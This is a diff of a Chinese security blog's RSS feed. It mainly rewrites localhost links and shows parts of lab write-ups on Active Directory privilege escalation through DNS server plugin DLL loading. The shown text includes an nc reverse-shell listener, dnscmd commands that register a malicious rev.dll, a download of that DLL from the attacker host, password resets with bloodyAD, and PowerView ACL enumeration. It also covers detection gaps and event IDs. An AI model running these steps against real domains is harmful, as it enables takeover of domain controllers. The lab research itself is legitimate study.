+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;命令成功完成。
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ nc -lnvp &lt;span style=&#34;color:#ae81ff&#34;&gt;443&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;listening on &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;any&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;443&lt;/span&gt; ...
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;connect to &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;192.168.174.129&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; from &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;UNKNOWN&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;192.168.174.143&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;55669&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Microsoft Windows &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;°汾 10.0.20348.169&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;c&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; Microsoft Corporation¡£±£´̹ԐȨ&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;¡£
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;C:&lt;span style=&#34;color:#ae81ff&#34;&gt;\W&lt;/span&gt;indows&lt;span style=&#34;color:#ae81ff&#34;&gt;\s&lt;/span&gt;ystem32&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;所以这里我意识到，只要我们对dns容器存在读取写入权限，我们就能利用热重载进行攻击&lt;/p&gt;
+&lt;p&gt;于是我又测试了仅仅给dns-test给予属性读写，看他能否操作热重载&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;允许 BICKER&lt;span style=&#34;color:#ae81ff&#34;&gt;\d&lt;/span&gt;ns-test  特殊访问
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   WRITE PROPERTY &lt;span style=&#34;color:#75715e&#34;&gt;#属性写入&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   READ PROPERTY &lt;span style=&#34;color:#75715e&#34;&gt;#属性读取&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;evil-winrm-py PS C:&lt;span style=&#34;color:#ae81ff&#34;&gt;\w&lt;/span&gt;irteTEMP&amp;gt; dnscmd.exe /config /serverlevelplugindll C:&lt;span style=&#34;color:#ae81ff&#34;&gt;\w&lt;/span&gt;irteTEMP&lt;span style=&#34;color:#ae81ff&#34;&gt;\r&lt;/span&gt;ev.dll
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;DNS 服务器未能重置注册属性。
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    状态 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0x00000005&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;命令失败:  ERROR_ACCESS_DENIED     &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;    0x5
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;失败是正常的，单一的属性读取并不足以dnscmd进行认证&lt;/p&gt;
+&lt;p&gt;所以现在可以给出现阶段的研究结论了:&lt;/p&gt;
+&lt;p&gt;执行热重载dns劫持并不一定需要成为dnsadmin组，而只需要对MicrosoftDNS容器的通用读取权限以及写入属性权限（&lt;a class=&#34;link&#34; href=&#34;https://www.semperis.com/blog/dnsadmins-revisited/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Yuval Gordon&lt;/a&gt;文章指出需要通用写入以及通用读取，在以上的测试中我发现通用写入并不一定需要且配置起来比较困难，所以读取属性权限就够了），以及对dc的rpc访问权限即可（域用户即可）&lt;/p&gt;
+&lt;h2 id=&#34;攻击路径检测难度&#34;&gt;攻击路径检测难度
+&lt;/h2&gt;&lt;p&gt;那么这种不再dnsadmin组中却对dns容器存在acl的情况是否容易检测呢？&lt;/p&gt;
+&lt;p&gt;通过猎犬，我们可以看到用户没有出站，针对性查找也无法查找，这很正常&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/dnsadmin/image.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;猎犬只抓取&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;用户（User）
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;组（Group）
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;计算机（Computer）
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;OU（组织单位）
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;域（Domain）
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;GPO（组策略对象）
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;而MicrosoftDNS属于system容器，容器(Container)默认是不会被抓取的，因为它不是常规的 OU 或对象类型，正常的hound只扫描标准AD-ACL。&lt;/p&gt;
+&lt;p&gt;但是powerview的高危筛选就能清晰的筛选出来&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;evil-winrm-py PS C:&lt;span style=&#34;color:#ae81ff&#34;&gt;\w&lt;/span&gt;irteTEMP&amp;gt;. .&lt;span style=&#34;color:#ae81ff&#34;&gt;\P&lt;/span&gt;owerView.ps1
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;evil-winrm-py PS C:&lt;span style=&#34;color:#ae81ff&#34;&gt;\w&lt;/span&gt;irteTEMP&amp;gt; Find-InterestingDomainAcl -ResolveGUIDs
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ObjectDN                : CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;MicrosoftDNS,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;System,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;bicker,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;com
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;AceQualifier            : AccessAllowed
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ActiveDirectoryRights   : Self, WriteProperty, GenericRead
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ObjectAceType           : None
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;AceFlags                : None
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;AceType                 : AccessAllowed
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;InheritanceFlags        : None
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SecurityIdentifier      : S-1-5-21-298176814-2846777796-698167141-3601
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;IdentityReferenceName   : dns-test
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;IdentityReferenceDomain : bicker.com
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;IdentityReferenceDN     : CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;dns-test,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Users,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;bicker,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;com
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;IdentityReferenceClass  : user
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;所以在这种情况下只能利用利用rast模块本地枚举或者powerview&lt;/p&gt;
+&lt;h2 id=&#34;restart优点和缺点&#34;&gt;/restart优点和缺点
+&lt;/h2&gt;&lt;p&gt;当我们利用热重载进行攻击过后，查看dns的日志文件，发现仅存在事件&lt;/p&gt;
+&lt;p&gt;事件ID770（已加载服务器级插件 DLL）事件ID140，而正常的服务重启会产生7035(服务重启)，7036(服务状态更改)等事件，这些事件无一例外的都会产生大量“噪音”&lt;/p&gt;
+&lt;p&gt;为何利用/restart操作会这样呢，其实问题藏在事件ID140报错当中（rpc终结点重复）&lt;/p&gt;
+&lt;p&gt;DNS管理面是通过RPC终结点对外提供接口的。一个服务在对外“开门”前，会先注销旧终结点，再注册新终结点，无论是正常重启还是内部重载，代码层面都去调了“注销终结点”的同一个 API，但这个注销动作失败了，可以这么理解&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;正常重启：原理是服务进程会退出，重新启动一个新进程，在退出进程前服务注销失败，但进程马上退出。进程一退出，RPC运行时会自动清理它的终结点注册，所以不会留下脏状态；新进程再起来，顺利注册，没有后续错误。&lt;/li&gt;
+&lt;li&gt;内部重载（/Restart）:同一个进程里调用内部函数reloadShutdown，把组件“关—再开”，不退出进程。类似“热重载”但是进程并未重启。所以注销失败后，旧的终结点还挂着；接着重载流程又去注册相同的终结点，于是 RPC 端点映射器发现“这玩意儿已经有了”，报 140事件错误&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;从这件事件可以看出热重载和服务重启的区别&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;服务重启会产生大量日志报告，且需要服务重启权限，一般需要域管理或者server2019前存在的默认组服务操作员等权限，或者更彻底一点，直接等待机器重启，但是重启后并不会导致dns管理平台失控，还是正常允许我们撤销dll痕迹清楚&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;热重载“噪音小”且只需要dnsadmin或者容器读写权限即可单独操作，但是会导致140错误，在机器下次重启之前dns管理平台会死机，这个进程将不再允许dns管理控制台的介入，dnscmd也无法进行下一步工作&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;感谢&#34;&gt;感谢
+&lt;/h2&gt;&lt;p&gt;本拙略冗长的文章就到此结束了，在这次研究中我还是有很多底层或者权限理解并未搞清楚，会在之后继续学习，并分享出来，感谢以下文章以及人员的帮助&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.semperis.com/blog/dnsadmins-revisited/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Yuval Gordon&lt;/a&gt;的文章是我这篇文章的基础&lt;/p&gt;
+&lt;p&gt;感谢IPv32 乔.九九.☆.0/24的帮助，这篇文章的由来也是因为他对我的靶机产生了非预期解（笑哭）&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>bicker-wp</title>
-        <link>http://localhost:1313/post/bicher-%E8%87%AA%E5%BB%BA/</link>
+        <link>https://wackymaker.github.io/post/bicher-%E8%87%AA%E5%BB%BA/</link>
         <pubDate>Mon, 25 Aug 2025 15:15:18 +0800</pubDate>
         
-        <guid>http://localhost:1313/post/bicher-%E8%87%AA%E5%BB%BA/</guid>
+        <guid>https://wackymaker.github.io/post/bicher-%E8%87%AA%E5%BB%BA/</guid>
         <description>&lt;h2 id=&#34;信息收集&#34;&gt;信息收集
 &lt;/h2&gt;&lt;p&gt;主机确认&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/synthetic/bicker&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
@@ -59,7 +279,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Open 192.168.174.143:9389
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;简单扫描了一下确认为dc域控，那就不详细扫描了直接测试主要端口&lt;/p&gt;
 &lt;h2 id=&#34;突破边界&#34;&gt;突破边界
-&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image.png&#34;
+&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image.png&#34;
 	
 	
 	
@@ -68,7 +288,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;存在smb匿名，直接连接puppy，发现一张图片&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image-1.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image-1.png&#34;
 	
 	
 	
@@ -77,7 +297,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;一张意义不明的图片&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image-2.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image-2.png&#34;
 	
 	
 	
@@ -120,7 +340,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Image Size                      : 620x381
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Megapixels                      : 0.236
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在其中发现bilibili以及uid关键字，去b站查找到定位账号&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image-3.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image-3.png&#34;
 	
 	
 	
@@ -174,7 +394,7 @@
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nxc ldap &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$ip&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$user1&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; -p &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$pass1&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; --bloodhound --collection All --dns-server &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$ip&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这里我为了方便利用nxc去抓取，并且因为本地部署不影响，正常情况大家还是使用其他工具比较稳定&lt;/p&gt;
 &lt;p&gt;tindalos并未有稳定的出站，但是我找到了一个有意思的组&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image-4.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image-4.png&#34;
 	
 	
 	
@@ -246,7 +466,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Username    : lihua
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Unknown     : hello%2633
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;成功解密出lihua的账户密码&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image-5.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image-5.png&#34;
 	
 	
 	
@@ -255,7 +475,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;并且能成功登陆，查看猎犬&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image-6.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image-6.png&#34;
 	
 	
 	
@@ -265,7 +485,7 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;发现lihua属于账户操作员组，对低权限所有用户都有通用掌控，于是我们直接能直接修改dns重启员的账户&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;bloodyAD --host &amp;lt;DC_IP&amp;gt; -d &amp;lt;域名&amp;gt; -u &amp;lt;管理员用户名&amp;gt; -p &amp;lt;管理员密码&amp;gt; set password &amp;lt;目标用户&amp;gt; &amp;lt;新密码&amp;gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image-7.png&#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image-7.png&#34;
 	
 	
 	
@@ -274,7 +494,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;利用修改账号密码登陆&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image-8.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image-8.png&#34;
 	
 	
 	
@@ -300,7 +520,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;不要使用evil-winrm上传，因为evil-winrm的bug，看上去上传成功其实长度是0&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Invoke-WebRequest -Uri &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://192.168.174.129/rev.dll&amp;#34;&lt;/span&gt; -OutFile &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;C:\wirteTEMP\rev.dll&amp;#34;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;还是使用古法上传，之后利用tindalos注册此dll&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image-9.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image-9.png&#34;
 	
 	
 	
@@ -310,7 +530,7 @@
 &gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;注意这一步是无法回头的，注意快照
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;之后在jianyin用户上重启服务&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image-10.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image-10.png&#34;
 	
 	
 	
@@ -319,7 +539,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;从另外一边的监听直接接受shell&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image-11.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image-11.png&#34;
 	
 	
 	
@@ -328,7 +548,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;权限为system成功获取rootflag&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image-12.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image-12.png&#34;
 	
 	
 	
@@ -341,10 +561,10 @@
         </item>
         <item>
         <title>剥茧之书</title>
-        <link>http://localhost:1313/post/%E5%89%A5%E8%8C%A7%E4%B9%8B%E4%B9%A6/</link>
+        <link>https://wackymaker.github.io/post/%E5%89%A5%E8%8C%A7%E4%B9%8B%E4%B9%A6/</link>
         <pubDate>Sat, 23 Aug 2025 21:42:11 +0800</pubDate>
         
-        <guid>http://localhost:1313/post/%E5%89%A5%E8%8C%A7%E4%B9%8B%E4%B9%A6/</guid>
+        <guid>https://wackymaker.github.io/post/%E5%89%A5%E8%8C%A7%E4%B9%8B%E4%B9%A6/</guid>
         <description>&lt;h1 id=&#34;日志分析&#34;&gt;日志分析
 &lt;/h1&gt;&lt;h2 id=&#34;sysmon日志&#34;&gt;Sysmon日志
 &lt;/h2&gt;&lt;p&gt;Sysmon日志是由Microsoft系统监视器（Sysmon）生成的事件日志，它们提供有关Windows上的系统级操作的详细信息，并记录进程启动、网络连接、文件和注册表修改、驱动程序和服务活动以及WMI操作等活动，通过分析Sysmon日志，安全专家可以检测潜在风险、发现异常并响应安全事件，以增强整体系统监控和安全性。在不断变化的网络安全环境中，提前防范威胁非常重要。&lt;/p&gt;
@@ -635,10 +855,10 @@
         </item>
         <item>
         <title>渊蜂之书</title>
-        <link>http://localhost:1313/post/%E6%B8%8A%E8%9C%82%E4%B9%8B%E4%B9%A6/</link>
+        <link>https://wackymaker.github.io/post/%E6%B8%8A%E8%9C%82%E4%B9%8B%E4%B9%A6/</link>
         <pubDate>Sat, 23 Aug 2025 21:25:37 +0800</pubDate>
         
-        <guid>http://localhost:1313/post/%E6%B8%8A%E8%9C%82%E4%B9%8B%E4%B9%A6/</guid>
+        <guid>https://wackymaker.github.io/post/%E6%B8%8A%E8%9C%82%E4%B9%8B%E4%B9%A6/</guid>
         <description>&lt;h1 id=&#34;钓鱼相关-投放器构造-载荷构造&#34;&gt;钓鱼相关-投放器构造-载荷构造
 &lt;/h1&gt;&lt;h2 id=&#34;hta加载js源码&#34;&gt;.hta加载js源码
 &lt;/h2&gt;&lt;p&gt;（逐渐抛弃，特定情况再使用，容易被浏览器沙箱gank）&lt;/p&gt;
@@ -793,10 +1013,10 @@
         </item>
         <item>
         <title>使用普通用户帐户远程利用RBCD</title>
-        <link>http://localhost:1313/post/%E4%BD%BF%E7%94%A8%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E5%B8%90%E6%88%B7%E8%BF%9C%E7%A8%8B%E5%88%A9%E7%94%A8rbcd/</link>
+        <link>https://wackymaker.github.io/post/%E4%BD%BF%E7%94%A8%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E5%B8%90%E6%88%B7%E8%BF%9C%E7%A8%8B%E5%88%A9%E7%94%A8rbcd/</link>
         <pubDate>Sat, 23 Aug 2025 20:02:05 +0800</pubDate>
         
-        <guid>http://localhost:1313/post/%E4%BD%BF%E7%94%A8%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E5%B8%90%E6%88%B7%E8%BF%9C%E7%A8%8B%E5%88%A9%E7%94%A8rbcd/</guid>
+        <guid>https://wackymaker.github.io/post/%E4%BD%BF%E7%94%A8%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E5%B8%90%E6%88%B7%E8%BF%9C%E7%A8%8B%E5%88%A9%E7%94%A8rbcd/</guid>
         <description>&lt;h1 id=&#34;使用普通用户帐户远程利用-rbcd基于资源委派&#34;&gt;使用普通用户帐户远程利用 RBCD（基于资源委派）
 &lt;/h1&gt;&lt;h2 id=&#34;我是站在巨人们的肩膀上&#34;&gt;我是站在巨人们的肩膀上
 &lt;/h2&gt;&lt;p&gt;在这篇文章开始之前，我本来想详细解释一下rbcd，奈何&lt;a class=&#34;link&#34; href=&#34;https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
@@ -1001,10 +1221,10 @@
         </item>
         <item>
         <title>血缇之书</title>
-        <link>http://localhost:1313/post/%E8%A1%80%E7%BC%87%E4%B9%8B%E4%B9%A6/</link>
+        <link>https://wackymaker.github.io/post/%E8%A1%80%E7%BC%87%E4%B9%8B%E4%B9%A6/</link>
         <pubDate>Sat, 23 Aug 2025 19:40:56 +0800</pubDate>
         
-        <guid>http://localhost:1313/post/%E8%A1%80%E7%BC%87%E4%B9%8B%E4%B9%A6/</guid>
+        <guid>https://wackymaker.github.io/post/%E8%A1%80%E7%BC%87%E4%B9%8B%E4%B9%A6/</guid>
         <description>&lt;h1 id=&#34;信息收集-枚举&#34;&gt;信息收集-枚举
 &lt;/h1&gt;&lt;h2 id=&#34;前枚举&#34;&gt;前枚举
 &lt;/h2&gt;&lt;h3 id=&#34;域名解析&#34;&gt;域名解析
@@ -3903,16 +4123,16 @@ linux换行&lt;/p&gt;
         </item>
         <item>
